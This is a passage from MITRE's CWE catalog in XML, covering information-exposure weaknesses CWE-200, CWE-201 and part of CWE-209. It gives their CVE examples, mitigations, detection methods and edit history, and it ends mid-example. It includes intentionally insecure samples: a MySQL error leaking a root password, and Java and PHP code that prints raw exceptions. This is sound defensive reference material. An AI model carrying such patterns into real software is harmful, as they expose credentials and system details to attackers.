               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2049</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5172</Reference>
               <Description>Program reveals password in error message if attacker can trigger certain database errors.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5172</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4638</Reference>
               <Description>Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4638</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1409</Reference>
               <Description>Direct request to library file in web application triggers pathname leak in error message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-1409</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0603</Reference>
               <Description>Malformed regexp syntax leads to information exposure in error message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2268</Reference>
               <Description>Password exposed in debug information.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2268</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1078</Reference>
               <Description>FTP client with debug option enabled shows password to the screen.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1078</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-0708</Reference>
               <Description>Collaboration platform does not clear team emails in a response, allowing leak of email addresses</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-0708</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Information Leak (information disclosure)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Information Leakage and Improper Error Handling</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>13</Entry_ID>
               <Entry_Name>Information Leakage</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="116"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="169"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="224"/>
            <Related_Attack_Pattern CAPEC_ID="285"/>
            <Related_Attack_Pattern CAPEC_ID="287"/>
            <Related_Attack_Pattern CAPEC_ID="290"/>
            <Related_Attack_Pattern CAPEC_ID="291"/>
            <Related_Attack_Pattern CAPEC_ID="292"/>
            <Related_Attack_Pattern CAPEC_ID="293"/>
            <Related_Attack_Pattern CAPEC_ID="294"/>
            <Related_Attack_Pattern CAPEC_ID="295"/>
            <Related_Attack_Pattern CAPEC_ID="296"/>
            <Related_Attack_Pattern CAPEC_ID="297"/>
            <Related_Attack_Pattern CAPEC_ID="298"/>
            <Related_Attack_Pattern CAPEC_ID="299"/>
            <Related_Attack_Pattern CAPEC_ID="300"/>
            <Related_Attack_Pattern CAPEC_ID="301"/>
            <Related_Attack_Pattern CAPEC_ID="302"/>
            <Related_Attack_Pattern CAPEC_ID="303"/>
            <Related_Attack_Pattern CAPEC_ID="304"/>
            <Related_Attack_Pattern CAPEC_ID="305"/>
            <Related_Attack_Pattern CAPEC_ID="306"/>
            <Related_Attack_Pattern CAPEC_ID="307"/>
            <Related_Attack_Pattern CAPEC_ID="308"/>
            <Related_Attack_Pattern CAPEC_ID="309"/>
            <Related_Attack_Pattern CAPEC_ID="310"/>
            <Related_Attack_Pattern CAPEC_ID="312"/>
            <Related_Attack_Pattern CAPEC_ID="313"/>
            <Related_Attack_Pattern CAPEC_ID="317"/>
            <Related_Attack_Pattern CAPEC_ID="318"/>
            <Related_Attack_Pattern CAPEC_ID="319"/>
            <Related_Attack_Pattern CAPEC_ID="320"/>
            <Related_Attack_Pattern CAPEC_ID="321"/>
            <Related_Attack_Pattern CAPEC_ID="322"/>
            <Related_Attack_Pattern CAPEC_ID="323"/>
            <Related_Attack_Pattern CAPEC_ID="324"/>
            <Related_Attack_Pattern CAPEC_ID="325"/>
            <Related_Attack_Pattern CAPEC_ID="326"/>
            <Related_Attack_Pattern CAPEC_ID="327"/>
            <Related_Attack_Pattern CAPEC_ID="328"/>
            <Related_Attack_Pattern CAPEC_ID="329"/>
            <Related_Attack_Pattern CAPEC_ID="330"/>
            <Related_Attack_Pattern CAPEC_ID="472"/>
            <Related_Attack_Pattern CAPEC_ID="497"/>
            <Related_Attack_Pattern CAPEC_ID="508"/>
            <Related_Attack_Pattern CAPEC_ID="573"/>
            <Related_Attack_Pattern CAPEC_ID="574"/>
            <Related_Attack_Pattern CAPEC_ID="575"/>
            <Related_Attack_Pattern CAPEC_ID="576"/>
            <Related_Attack_Pattern CAPEC_ID="577"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="616"/>
            <Related_Attack_Pattern CAPEC_ID="643"/>
            <Related_Attack_Pattern CAPEC_ID="646"/>
            <Related_Attack_Pattern CAPEC_ID="651"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Discouraged (this CWE ID should not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: CWE-200 is commonly misused to represent the loss of confidentiality in a vulnerability, but confidentiality loss is a technical impact - not a root cause error. As of CWE 4.9, over 400 CWE entries can lead to a loss of confidentiality. Other options are often available. [REF-1287].</xhtml:p>
               <xhtml:p>Comments: if an error or mistake causes information to be disclosed,
	       then use the CWE ID for that error. Consider starting with improper authorization (CWE-285), insecure permissions (CWE-732), improper authentication (CWE-287), etc. Also consider children such as Insertion of Sensitive Information Into Sent Data (CWE-201), Observable Discrepancy (CWE-203), Insertion of Sensitive Information into Externally-Accessible File or Directory (CWE-538), or others.</xhtml:p>
            </Note>
            <Note Type="Maintenance">As a result of mapping analysis in the 2020 Top 25 and more recent versions, this weakness is under review, since it is frequently misused in mapping to cover many problems that lead to loss of confidentiality. See Mapping Notes, Extended Description, and Alternate Terms.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Related_Attack_Patterns, Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Description, Maintenance_Notes, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples, References</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
			      <Contribution_Name>Nick Johnston</Contribution_Name>
			      <Contribution_Date>2022-07-11</Contribution_Date>
			      <Contribution_Comment>Identified incorrect language tag in demonstrative example.</Contribution_Comment>
			   </Contribution>
            <Previous_Entry_Name Date="2009-12-28">Information Leak (Information Disclosure)</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="201" Name="Insertion of Sensitive Information Into Sent Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The code transmits data to another actor, but a portion of the data includes sensitive information that should not be accessible to that actor.</Description>
	 <Extended_Description>Sensitive information could include data that is sensitive in and of itself (such as credentials or private messages), or otherwise useful in the further exploitation of the system (such as internal file system structure).
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="209" View_ID="1000"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="202" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Memory</Impact>
               <Impact>Read Application Data</Impact>
               <Note>Sensitive data may be exposed to attackers.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Specify which data in the software should be regarded as sensitive. Consider which types of users should have access to which types of data.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Ensure that any possibly sensitive data specified in the requirements is verified with designers to ensure that it is either a calculated risk or mitigated elsewhere. Any information that is not necessary to the functionality should be removed in order to lower both the overhead and the possibility of security sensitive data being sent.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Setup default error messages so that unexpected errors do not disclose sensitive information.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-129">
               <Intro_Text>The following is an actual MySQL error statement:</Intro_Text>
               <Example_Code Nature="Result" Language="SQL">
                  <xhtml:div>Warning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4</xhtml:div>
               </Example_Code>
               <Body_Text>The error clearly exposes the database credentials.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>   
            <Observed_Example>
               <Reference>CVE-2022-0708</Reference>
               <Description>Collaboration platform does not clear team emails in a response, allowing leak of email addresses</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-0708</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Accidental leaking of sensitive information through sent data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="12"/>
            <Related_Attack_Pattern CAPEC_ID="217"/>
            <Related_Attack_Pattern CAPEC_ID="612"/>
            <Related_Attack_Pattern CAPEC_ID="613"/>
            <Related_Attack_Pattern CAPEC_ID="618"/>
            <Related_Attack_Pattern CAPEC_ID="619"/>
            <Related_Attack_Pattern CAPEC_ID="621"/>
            <Related_Attack_Pattern CAPEC_ID="622"/>
            <Related_Attack_Pattern CAPEC_ID="623"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Name, References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Description, Name</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2010-09-27">Information Leak Through Sent Data</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Sent Data</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-08-20">Exposure of Sensitive Information Through Sent Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="209" Name="Generation of Error Message Containing Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product generates an error message that includes sensitive information about its environment, users, or associated data.</Description>
         <Extended_Description><xhtml:p>The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more serious attacks. The error message may be created in different ways:</xhtml:p>
           <xhtml:ul>
             <xhtml:li>self-generated: the source code explicitly constructs the error message and delivers it</xhtml:li>
	     <xhtml:li>externally-generated: the external environment, such as a language interpreter, handles the error and constructs its own message, whose contents are not under direct control by the programmer</xhtml:li>
	   </xhtml:ul>
	 <xhtml:p>An attacker may use the contents of error messages to help launch another, more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of ".." sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query.</xhtml:p></Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="755" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="PHP" Prevalence="Often"/>
            <Language Name="Java" Prevalence="Often"/>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Often this will either reveal sensitive information which may be used for a later attack or private information stored in the server.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>This weakness generally requires domain-specific interpretation using manual analysis. However, the number of potential error conditions may be too large to cover completely within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated methods may be able to detect certain idioms automatically, such as exposed stack traces or pathnames, but violation of business rules or privacy requirements is not typically feasible.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</xhtml:p>
                  <xhtml:p>Error conditions may be triggered with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method>Manual Dynamic Analysis</Method>
               <Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Handle exceptions internally and do not display errors containing potentially sensitive information to a user.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
               <Effectiveness_Notes>This makes it easier to spot places in the code where data is being used that is unencrypted.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-40">
               <Phase>Implementation</Phase>
               <Phase>Build and Compilation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Debugging information should not make its way into a production release.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-40">
               <Phase>Implementation</Phase>
               <Phase>Build and Compilation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Debugging information should not make its way into a production release.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Where available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Create default error pages or messages that do not leak any information.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, sensitive information might be printed depending on the exception that occurs.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">/.../</xhtml:div>}<xhtml:br/>catch (Exception e) {<xhtml:div style="margin-left:1em;">System.out.println(e);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an exception related to SQL is handled by the catch, then the output might contain sensitive information such as SQL query structure or private information. If this output is redirected to a web user, this may represent a security problem.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-118">
               <Intro_Text>This code tries to open a database connection, and prints any exceptions that occur.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">openDbConnection();</xhtml:div>}<xhtml:br/>
                     <xhtml:i>//print exception message that includes exception message and configuration file location</xhtml:i>
